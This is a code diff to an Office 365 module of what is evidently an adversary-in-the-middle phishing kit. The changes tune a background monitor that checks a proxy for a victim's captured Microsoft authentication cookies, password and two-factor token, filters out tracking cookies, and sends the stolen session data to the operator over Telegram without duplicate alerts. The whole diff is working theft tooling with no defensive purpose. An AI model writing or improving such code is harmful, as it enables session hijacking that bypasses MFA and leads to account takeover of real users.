@@ -214,17 +214,31 @@ class Office365Module(BaseModule):
             import threading
             self.log(f"[AiTM] Threading imported successfully")
             
+            # Add session tracking to prevent duplicate messages
+            self.aitm_results_sent = False
+            self.last_cookie_count = 0
+            
             def _monitor_aitm_results():
                 try:
                     self.log(f"[AiTM] Background monitor thread started")
+                    
+                    # Wait 30 seconds before starting monitoring to let the page load properly
+                    self.log(f"[AiTM] Waiting 30s for page to load before starting monitoring...")
+                    time.sleep(30)
+                    
                     # Monitor for 5 minutes for victim interaction
                     start_time = time.time()
                     timeout = 300  # 5 minutes
                     self.log(f"[AiTM] Monitor timeout set to {timeout} seconds")
                     
                     while time.time() - start_time < timeout:
-                        time.sleep(10)  # Check every 10 seconds
+                        time.sleep(15)  # Check every 15 seconds (less aggressive)
                         self.log(f"[AiTM] Monitor check - elapsed: {int(time.time() - start_time)}s")
+                        
+                        # Skip if we already sent results
+                        if self.aitm_results_sent:
+                            self.log(f"[AiTM] Results already sent, continuing monitoring for session changes...")
+                            continue
                         
                         # Get captured data from proxy
                         try:
@@ -234,21 +248,55 @@ class Office365Module(BaseModule):
                             self.log(f"[AiTM] Exception getting attack results: {get_ex}")
                             captured_data = {}
 
-                        # Check if we captured anything
-                        if captured_data.get('cookies') or captured_data.get('credentials') or captured_data.get('session_info', {}).get('auth_success'):
-                            self.log(f"[AiTM] Data captured! Validating session...")
-                            # We got something! Validate and send results
+                        # Check if we have significant cookies (not just tracking cookies)
+                        significant_cookies = []
+                        if captured_data.get('cookies'):
+                            for cookie_data in captured_data['cookies']:
+                                cookie = cookie_data.get('parsed', {})
+                                if cookie.get('name'):
+                                    name = cookie['name'].upper()
+                                    # Look for authentication cookies, not just tracking
+                                    if any(important in name for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
+                                        significant_cookies.append(cookie['name'])
+                        
+                        cookie_count = len(captured_data.get('cookies', []))
+                        significant_count = len(significant_cookies)
+                        
+                        # Only send results if we have significant cookies AND cookie count increased meaningfully
+                        has_meaningful_data = (
+                            significant_count > 0 or  # Has auth cookies
+                            cookie_count > 20 or      # Has many cookies (likely authenticated)
+                            captured_data.get('credentials') or 
+                            captured_data.get('session_info', {}).get('auth_success')
+                        )
+                        
+                        # Check for significant increase in cookies (not just 1-2 tracking cookies)
+                        significant_increase = (cookie_count - self.last_cookie_count) >= 5
+                        
+                        if has_meaningful_data and (significant_increase or self.last_cookie_count == 0):
+                            self.log(f"[AiTM] Meaningful data captured! Cookies: {cookie_count}, Significant: {significant_count}")
+                            self.log(f"[AiTM] Significant cookies: {significant_cookies}")
+                            
+                            # We got something meaningful! Validate and send results
                             try:
                                 validation_result = self.aitm_manager.validate_session()
                                 self.log(f"[AiTM] Session validation completed")
                                 self._send_aitm_results(self.user, self.captured_password, self.two_factor_token, captured_data, validation_result)
                                 self.log(f"[AiTM] Results sent via Telegram")
+                                
+                                # Mark as sent to prevent duplicates
+                                self.aitm_results_sent = True
+                                self.last_cookie_count = cookie_count
+                                
                             except Exception as val_ex:
                                 self.log(f"[AiTM] Exception during validation/sending: {val_ex}")
                             
-                            # Success! Stop monitoring
+                            # Success! Stop monitoring after sending results
                             self.log(f"[AiTM] Successfully captured session data for {self.user}")
                             break
+                        else:
+                            self.log(f"[AiTM] Data not significant enough - Cookies: {cookie_count}, Significant: {significant_count}, Increase: {cookie_count - self.last_cookie_count}")
+                            self.last_cookie_count = cookie_count
                             
                     else:
                         # Timeout reached, no cookies captured
@@ -415,18 +463,42 @@ class Office365Module(BaseModule):
                         msg += f"  {key}: `{value}`\n"
                 msg += "\n"
             
-            # Add cookies summary
+            # Add cookies summary - show only meaningful authentication cookies
             if captured_data.get('cookies'):
-                important_cookies = []
+                auth_cookies = []
+                tracking_cookies = []
+                
                 for cookie_data in captured_data['cookies']:
                     cookie = cookie_data.get('parsed', {})
                     if cookie.get('name'):
                         name = cookie['name']
-                        if any(important in name.upper() for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'FPC']):
-                            important_cookies.append(name)
+                        name_upper = name.upper()
+                        
+                        # Categorize cookies
+                        if any(important in name_upper for important in ['ESTSAUTH', 'STSSERVICE', 'BUID', 'RTFA', 'FEDAUTH', 'SESSIONID']):
+                            auth_cookies.append(name)
+                        elif name_upper == 'FPC':
+                            tracking_cookies.append(name)
                 
-                if important_cookies:
-                    msg += f"🔑 Key Cookies: `{', '.join(important_cookies[:5])}`\n"
+                # Show auth cookies first, then tracking summary
+                display_cookies = []
+                if auth_cookies:
+                    # Remove duplicates and show unique auth cookies
+                    unique_auth = list(dict.fromkeys(auth_cookies))  # Preserves order, removes duplicates
+                    display_cookies.extend(unique_auth[:3])  # Show max 3 auth cookies
+                
+                if tracking_cookies and len(display_cookies) < 3:
+                    # Only show "FPC(x2)" style summary for tracking cookies
+                    fpc_count = len(tracking_cookies)
+                    if fpc_count > 1:
+                        display_cookies.append(f"FPC({fpc_count})")
+                    else:
+                        display_cookies.append("FPC")
+                
+                if display_cookies:
+                    msg += f"🔑 Key Cookies: `{', '.join(display_cookies)}`\n"
+                elif len(captured_data['cookies']) > 0:
+                    msg += f"🔑 Key Cookies: `{len(captured_data['cookies'])} captured (analysis in progress)`\n"
             
             # Add validation details
             if validation_result:
@@ -876,42 +948,33 @@ class Office365Module(BaseModule):
                         important_cookies.append(name)
             
             if important_cookies:
-                # We got authentication cookies! Send immediate notification
-                cookie_msg = (
-                    f"*🔥 AiTM Session Cookies Captured!*\n"
-                    f"Email: `{getattr(self, 'user', 'Unknown')}`\n"
-                    f"🍪 Important Cookies: `{', '.join(important_cookies[:5])}`\n"
-                    f"⚡ Validating session..."
-                )
-                self.send_telegram(cookie_msg)
+                # Check if this is a new significant capture (avoid spam)
+                if not hasattr(self, 'last_cookie_notification_count'):
+                    self.last_cookie_notification_count = 0
                 
-                # Trigger validation in background
-                threading.Thread(target=self._validate_and_report_session, daemon=True).start()
+                current_count = len(important_cookies)
+                if current_count > self.last_cookie_notification_count:
+                    # Only send notification for meaningful increase
+                    self.log(f"[AiTM] Significant cookies detected: {important_cookies}")
+                    self.last_cookie_notification_count = current_count
+                    
+                    # Update the monitoring that we have meaningful data
+                    if hasattr(self, 'aitm_results_sent') and not self.aitm_results_sent:
+                        # Let the main monitoring thread handle sending results
+                        # This prevents duplicate messages
+                        self.log(f"[AiTM] Deferring to main monitoring thread for result reporting")
+                else:
+                    self.log(f"[AiTM] Duplicate cookie notification prevented (count: {current_count})")
             
         except Exception as e:
             self.log(f"Error handling captured cookies: {e}")
 
     def _validate_and_report_session(self):
-        """Validate captured session and send full report"""
-        try:
-            time.sleep(2)  # Give a moment for more cookies to be captured
-            
-            # Get all captured data
-            if self.aitm_manager and self.aitm_manager.proxy:
-                captured_data = self.aitm_manager.get_attack_results()
-                validation_result = self.aitm_manager.validate_session()
-                
-                # Send comprehensive results
-                self._send_aitm_results(
-                    getattr(self, 'user', 'Unknown'), 
-                    getattr(self, 'captured_password', 'Unknown'), 
-                    getattr(self, 'two_factor_token', 'Unknown'), 
-                    captured_data, 
-                    validation_result
-                )
-                
-        except Exception as e:
-            self.log(f"Error validating session: {e}")
+        """DEPRECATED: Validate captured session and send full report - now handled by main monitoring thread"""
+        # This function is disabled to prevent duplicate messages
+        # All validation and reporting is now handled by the main monitoring thread
+        self.log(f"[AiTM] _validate_and_report_session called but disabled to prevent duplicates")
+        return
 
 
     def send_telegram(self, message: str | None = None, document_paths: list | None = None):
